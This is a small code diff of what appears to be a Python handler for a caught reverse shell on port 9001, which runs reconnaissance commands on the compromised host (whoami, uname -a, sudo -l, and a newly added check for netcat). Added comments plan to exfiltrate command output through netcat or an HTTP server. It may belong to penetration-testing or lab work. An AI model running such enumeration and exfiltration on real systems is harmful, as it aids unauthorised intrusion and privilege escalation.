@@ -4,12 +4,17 @@ EXPECTED_PROMPT = b'$ '
 LISTENING_PORT = 9001
 COMMAND_TIMEOUT = 1 # Waits at least 1 second when 'until' string doesn't match
 
+# TODO: Instead of running a command directly and waiting for input
+#       Run command on system and output to a temporary file
+#       Download the file remotely (netcat, http server, etc)
+#       This should speed up a lot!
 def main():
     commands = [
         'whoami',
         'hostname',
         'uname -a',
-        'sudo -l'
+        'which nc',
+        'sudo -l' # TODO: Move longer output commands to the new 'remote download of output' thing
     ]
 
     commands_output = {}
